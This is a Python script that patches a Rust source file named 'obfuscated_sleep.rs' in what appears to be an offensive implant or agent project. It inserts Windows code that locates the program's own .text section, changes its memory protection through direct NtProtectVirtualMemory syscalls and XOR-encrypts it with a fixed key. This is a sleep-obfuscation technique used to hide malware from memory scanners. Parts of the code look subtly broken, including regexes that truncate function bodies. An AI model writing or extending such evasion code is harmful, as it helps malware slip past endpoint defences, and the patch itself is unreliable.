import re
with open("agent/src/obfuscated_sleep.rs", "r") as f:
    c = f.read()

# Replace encrypt_sections and decrypt_sections entirely
c = re.sub(r'pub fn encrypt_sections\(\) \{.*?\}', '', c, flags=re.DOTALL|re.MULTILINE)
c = re.sub(r'pub fn decrypt_sections\(\) \{.*?\}', '', c, flags=re.DOTALL|re.MULTILINE)

# If get_text_section is defined without cfg(windows), it might cause issues because winapi is missing.
# We will just encapsulate the whole block in cfg.
stub = '''
#[cfg(windows)]
pub fn encrypt_sections() {
    unsafe {
        if let Some((addr, size)) = get_text_section() {
            let mut old_protect = 0;
            // Let's use direct syscall wrapper or just winapi if imported. Wait, if winapi forms an error, maybe use NT syscall?
            crate::syscalls::syscall!("NtProtectVirtualMemory", ()-1isize, &mut (addr as *mut winapi::ctypes::c_void), &mut (size as usize), winapi::um::winnt::PAGE_READWRITE, &mut old_protect);
            let key = [0x13, 0x37, 0x13, 0x37];
            for i in 0..size { *addr.add(i) ^= key[i % 4]; }
            crate::syscalls::syscall!("NtProtectVirtualMemory", ()-1isize, &mut (addr as *mut winapi::ctypes::c_void), &mut (size as usize), old_protect, &mut old_protect);
        }
    }
}
#[cfg(windows)]
pub fn decrypt_sections() { encrypt_sections() }

#[cfg(not(windows))]
pub fn encrypt_sections() {}
#[cfg(not(windows))]
pub fn decrypt_sections() {}

// Fix missing get_text_section on non-windows
'''

# Wait, `get_text_section` was defined as `unsafe fn get_text_section`. I should make sure it has #[cfg(windows)] and dummy for linux
c = re.sub(r'unsafe fn get_text_section\(\).*?\}', r'''#[cfg(windows)]
unsafe fn get_text_section() -> Option<(*mut u8, usize)> {
    use winapi::um::libloaderapi::GetModuleHandleA;
    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE};
    let base = GetModuleHandleA(std::ptr::null_mut());
    if base.is_null() { return None; }
    let dos = base as *const IMAGE_DOS_HEADER;
    if (*dos).e_magic != IMAGE_DOS_SIGNATURE { return None; }
    let nt = (base as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    if (*nt).Signature != IMAGE_NT_SIGNATURE { return None; }
    let section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
    let name = (*section).Name;
    if name[0..5] == [b'.', b't', b'e', b'x', b't'] {
        return Some(((base as usize + (*section).VirtualAddress as usize) as *mut u8, *(*section).Misc.VirtualSize() as usize));
    }
    None
}
#[cfg(not(windows))]
unsafe fn get_text_section() -> Option<(*mut u8, usize)> { None }
''', c, flags=re.DOTALL)

with open("agent/src/obfuscated_sleep.rs", "w") as f:
    f.write(c + stub)

